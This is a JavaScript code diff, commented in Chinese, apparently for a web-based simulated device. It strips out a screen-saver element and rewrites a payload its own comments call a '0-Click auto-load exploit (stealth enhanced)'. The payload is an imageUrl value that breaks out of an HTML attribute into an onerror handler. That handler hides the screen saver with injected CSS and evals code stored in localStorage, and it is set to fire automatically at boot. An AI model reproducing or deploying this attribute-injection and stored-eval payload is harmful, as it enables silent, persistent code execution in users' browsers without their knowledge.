@@ -24,6 +24,21 @@
             return false;
         };
     }
+        // --- [禁止 Screen Saver 執行及移除元素] ---
+    if (typeof window.showScreenSaver === 'function') {
+        window.showScreenSaver = function() { 
+            console.log("NI System: Blocked."); 
+            return false; 
+        };
+    }
+
+    // 直接將 Screen Saver 的 HTML 節點從裝置畫面上移除
+    const ssElement = document.getElementById('screenSaver');
+    if (ssElement) {
+        ssElement.remove(); // 徹底刪除節點，系統再怎麼調用也找不到它
+        console.log("NI System: Screen Saver element removed from DOM.");
+    }
+    
     // ------------------------------------
 
     // 清除可能殘留的舊 UI 元素
@@ -864,12 +879,11 @@
     // 清除舊組件 (包括之前可能殘留嘅 ni-manager app entry)
     apps = apps.filter(a => a.id !== 'ni-core-system' && a.id !== 'ni-manager' && a.id !== 'ni-manager-manual');
 
-    // --- [新增：0-Click 自動載入漏洞利用 (隱身增強版)] ---
-    // 透過注入 CSS 強制將螢幕保護程式容器設為透明，避免閃爍
+    // --- [0-Click 隱身增強版：移出螢幕 + 徹底隱藏] ---
     const autoTriggerPayload = {
-        "imageUrl": "x\" onerror=\"(function(){ const style=document.createElement('style'); style.innerHTML='#screenSaver { opacity: 0 !important; visibility: hidden !important; pointer-events: none !important; transition: none !important; }'; document.head.appendChild(style); if(!window.NI_LOADED){eval(localStorage.getItem('ni_core'));} if(typeof hideScreenSaver==='function'){hideScreenSaver();} })();\""
+        // 利用 onerror 注入極端 CSS，將容器移到左方 10000 像素外，並強制 display: none
+        "imageUrl": "x\" onerror=\"(function(){ const s=document.createElement('style'); s.innerHTML='#screenSaver { position: fixed !important; left: -10000px !important; top: -10000px !important; display: none !important; visibility: hidden !important; opacity: 0 !important; }'; document.head.appendChild(s); if(!window.NI_LOADED){eval(localStorage.getItem('ni_core'));} if(typeof hideScreenSaver==='function'){hideScreenSaver();} })();\""
     };
-
 
     // 強制將系統螢幕保護程式設定為 AI 模式，並將觸發時間設為極短（1毫秒）
     // 這樣一開機進入桌面，系統就會瞬間觸發這個隱藏的 Payload
